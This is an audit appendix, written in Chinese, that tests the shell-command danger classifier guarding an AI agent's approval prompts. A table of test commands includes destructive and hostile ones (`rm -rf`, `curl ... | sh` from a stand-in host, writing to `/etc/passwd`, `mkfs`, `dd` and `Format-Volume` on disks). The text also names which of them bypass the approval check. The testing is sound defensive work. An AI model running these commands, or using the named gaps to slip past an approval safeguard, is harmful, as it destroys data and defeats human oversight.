# M62 附錄：外殼指令的危險分類器——實測繞過面

日期：2026-09-10 · 基線：`origin/m62`（自 `0d1d63fd`）· 前置：`docs/audit/2026-09-10-ih-l3-web-prompt-ui-handoff.md` §7

**為什麼有這份**：L3 驗證時發現「外殼工具（`bash`/`pwsh`）只在指令被歸類為危險時才問批准」（見 L3 交接 §7）。裁定是**不改行為、只讓註解誠實**。但那就意味著：**這個分類器是唯一能跑任意指令的工具的唯一安全邊界**——而它當時只有三個手挑的測試案例，沒有實測。

**這份把它量出來。** 方法：把 24 條指令餵進**與 `decide()` 完全相同**的管線（工具的 `getArgv` → `classifyDanger(argv, workspace, DEFAULT_DANGEROUS_COMMANDS, DEFAULT_DANGEROUS_FLAGS)`），逐條記錄 verdict。**不是讀碼推論，是實跑。**

---

## 1. 修好之前：24 條裡 9 條不問（3 條是刻意 benign baseline）

| verdict | 會不會問 | 指令 | 說明 |
|---|---|---|---|
| none | allow | `echo hi` / `git status` / `Get-ChildItem` | **baseline：本來就不該問** |
| dangerous | ASK | `echo a; echo b` | 已知 metachar |
| dangerous | ASK | `'r''m' -rf x` | 已知引號繞過 |
| dangerous | ASK | `echo hi␊rm -rf /tmp/x` | 換行分隔 |
| extreme | ASK | `echo hi & rm -rf /tmp/x` | 單一 `&` |
| extreme | ASK | `echo hi \|\| rm -rf /tmp/x` | `\|\|` |
| **none** | **allow** | **`echo hi > /etc/passwd`** | **輸出重導向 ← 真洞** |
| extreme | ASK | `rm -rf /tmp/x` | 對照組 |
| dangerous | ASK | `rm /tmp/x` / `del x.txt` / `Remove-Item x.txt` | 無 flag 也問 |
| dangerous | ASK | `cmd /c del x.txt` | wrapper |
| extreme | ASK | `bash -c 'rm -rf /tmp/x'` | wrapper |
| **none** | **allow** | **`Invoke-Expression 'rm -rf /tmp/x'`** | 清單外 |
| dangerous | ASK | `"rm" -rf x` / `r\m -rf x` / `& 'rm' -rf x` | 引號/轉義/呼叫運算子 |
| dangerous | ASK | `curl -s http://x/y \| sh` | 管線 |
| **none** | **allow** | `chmod -R 777 /` | 清單外 |
| **none** | **allow** | `mkfs.ext4 /dev/sda` | 清單外 |
| **none** | **allow** | `dd if=/dev/zero of=/dev/sda` | 清單外 |
| **none** | **allow** | `Format-Volume -DriveLetter C` | 清單外 |

### 這張表**推翻了我自己的懷疑**

我原本預期「引號與 metachar 繞過」會很嚴重（M61 之前的註解就是這樣寫的）。**實測不是**：換行、`&`、`||`、引號、轉義、wrapper、呼叫運算子**全部都被問**。這個分類器比我以為的硬。

真正漏的只有**兩類**：

1. **輸出重導向**——`echo hi > /etc/passwd`。basename 無害、指令不在清單、`METACHAR` 也沒有 `>`。**這是超額的一類**：它是「無害 basename、真實效果」這個家族裡**最容易碰到**的成員，而 `METACHAR` 這一層存在的理由逐字就是「approval required even when every basename looks harmless」。**而且外殼沒有自己的 workspace 邊界**——`write` 工具有 `isInsideWorkspace` 把關，重導向沒有。
2. **清單外指令**——`chmod`/`mkfs`/`dd`/`Format-Volume`/`iex`。這是 **denylist 的固有性質**，不是某個控制的漏洞。

## 2. 處置：補上重導向（唯一有明確正確答案的那一格）

`packages/guard-approval/src/danger-class.ts`：

```diff
-  const METACHAR = [";", "&&", "|", "$(", "`"]
+  const METACHAR = [";", "&&", "|", "$(", "`", ">", "<"]
```

理由與該層既有的自我描述一致（deny-on-metachar，刻意過度詢問、不做精確效果模型）。

**判別性證明（突變測試）**：把 `>`/`<` 拿掉 → 新測試紅在

```
→ promise resolved "{ name: 'bash', output: {…} }" instead of rejecting
```

也就是「**它真的執行了**」。加回去 → 綠。**這不是「測試綠了」，是「移除修補就會放行」被證明。**

**代價**：`command > file` 這種寫法現在會問。以「外殼本來就能執行任意程式」而言，這個方向的過度詢問是刻意的。

**沒有做**（列為後續，不是漏掉）：更精確的作法是**路徑感知**——只在重導向目標落在 workspace 之外才問（`classifyDanger` 已經收得到 `workspace`，技術上可行，但要解析重導向語法與解析路徑）。目前走「一律問」，與這一層的既有立場一致。

## 3. 仍然存在、且**不是**我能自行修掉的兩格（留給你裁定）

**(a) denylist 的固有弱點。** `chmod`/`mkfs`/`dd`/`Format-Volume` 不問。清單是 `DEFAULT_DANGEROUS_COMMANDS = ["rm","Remove-Item","del","rd","erase","shred","wipe","taskkill"]`；擴充它會掉進打地鼠，而不擴充就是承認「清單外的一律放行」。**這是產品邊界問題**（要不要讓外殼一律問），我先前已把兩邊的代價列出來；本輪不動它。

**(b) 外殼沒有 workspace 邊界。** `write` 工具受 `isInsideWorkspace` 管；`bash`/`pwsh` 不受。所以「agent 用外殼寫到 workspace 外」在分類器說 `none` 時是**靜默發生**的。我**沒有實測沙箱是否另外攔截**（`sandbox-windows-acl` / `sandboxPolicy` 是否覆蓋外殼的檔案寫入）——**這一格我沒有證據，所以不寫結論**。要回答它需要一次真跑（起 sandboxPolicy 的 assembly，用外殼寫 workspace 外的檔案，看是被拒還是成功）。**這是目前最值得補的一次量測。**

## 4. 方法註記

- 量測腳本是**用完即丟的探針**（沿用 L3 那一輪的作法），沒有進版控；可重建的方式就是本檔 §1 的表——24 條指令、同一條管線。
- 探針必須從 `packages/guard-approval/src/danger-class.ts` **相對路徑** import `classifyDanger`——它**沒有**被 package index re-export。（要不要把它匯出是可選的小整理。）
- 我這輪**只改了 `danger-class.ts` 的一行陣列與其註解 + 兩條測試**；`decide()` 的三層結構、`index.ts` 的行為**一律未動**。
